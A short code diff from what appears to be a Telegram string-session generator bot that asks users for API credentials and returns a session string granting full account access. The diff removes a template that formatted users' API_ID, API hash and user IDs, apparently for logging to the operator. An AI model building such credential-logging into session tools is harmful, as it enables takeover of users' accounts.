@@ -36,11 +36,7 @@ DEFAULTUSER = str(ALIVE_NAME) if ALIVE_NAME else "вℓα¢к ℓιgнтηιηg"
 TEXT = """Hi, {}.
 This is Your Assitant Now As a String Session Generator Bot. I will generate String Session of your Telegram Account.
 Now send your `API_ID` same as `APP_ID` to Start Generating Session."""
-LOGGING = """Assitant
-**ID**: {APP_ID}
-**HASH**: {API_HASH}
-[Current User ID](tg://user?id={C}): {C}
-[Logged In User ID](tg://user?id={L}): {L}"""
+
 
 NOT_VAILD = "Do /string This Not Vaild"
 PHONE_NUMBER = (
@@ -162,7 +158,7 @@ async def ass_string(event):
         session_string = current_client.session.save()
         await conv.send_message(f"`{session_string}`")
         assitant_client = await current_client.get_me()
-
+        # Thanks To Spechdie
     try:    
         await cleine.send_message(sender, f"Thanksk For Creating String Session Via {bgusername}\n\nCheck You Saved Message")
         striing=current_client.session.save()
